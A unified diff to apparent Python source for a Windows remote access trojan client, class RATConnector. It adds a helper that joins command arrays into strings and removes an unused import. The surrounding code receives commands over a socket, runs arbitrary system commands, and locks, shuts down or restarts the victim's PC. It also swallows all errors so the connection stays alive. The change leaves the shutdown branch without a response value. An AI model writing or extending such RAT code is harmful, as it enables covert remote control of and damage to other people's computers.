@@ -1,4 +1,4 @@
-import socket, subprocess, time, json, os, base64, requests, ctypes, os, sys
+import socket, subprocess, time, json, os, base64, ctypes, os, sys
 
 ctypes.windll.user32.MessageBoxW(
     0,
@@ -35,6 +35,12 @@ class RATConnector:
             # If ValueError returned then more data needs to be sent
             except ValueError:
                 continue
+
+    def arrayToString(self, s):
+        convStr = ""
+        for i in s:
+            convStr += i
+        return convStr
 
     # Run any command on the system
     def runCommand(self, command):
@@ -80,12 +86,12 @@ class RATConnector:
                     commandResponse = "[+] Clients PC locked"
                 elif command[0] == "shutdown":
                     os.system("shutdown /s /t 1")
-                    commandResponse = "[+] Clients PC is shutting down"
                 elif command[0] == "restart":
                     os.system("shutdown /r /t 1")
                     commandResponse = "[+] Clients PC is restarting"
                 else:
-                    commandResponse = self.runCommand(command).decode()
+                    convCommand = self.arrayToString(command)
+                    commandResponse = self.runCommand(convCommand).decode()
             # Whole error handling, bad practice but required to keep connection
             except Exception:
                 commandResponse = (
